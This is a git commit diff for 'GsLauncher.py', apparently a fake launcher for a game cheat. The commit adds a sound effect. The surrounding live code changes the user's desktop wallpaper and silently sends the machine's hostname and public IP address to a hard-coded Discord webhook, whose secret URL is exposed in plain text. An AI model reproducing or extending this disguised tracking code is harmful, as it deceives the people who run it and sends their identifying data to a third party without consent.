5af9a4dc1c08ce0e2edc91499162778350313ea3
ArekLubiPlacki <73820602+ArekLubiPlacki@users.noreply.github.com>
2024-01-08 20:36:13 +0100

    Update GsLauncher.py

--- GsLauncher.py
+++ GsLauncher.py
@@ -4,6 +4,7 @@ import socket
 import webbrowser
 import requests
 import ctypes
+import winsound
 ctypes.windll.user32.SystemParametersInfoW(20,0,'C:\\temp\\gamesense\\wallpaper.png', 3) 
 def get_ip_address():
     url = 'https://api.ipify.org'
@@ -18,6 +19,7 @@ pc = socket.gethostname()
 
 webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
 response = webhook.execute()
+winsound.PlaySound('chipi.wav', 0)
 
 
 window.close()
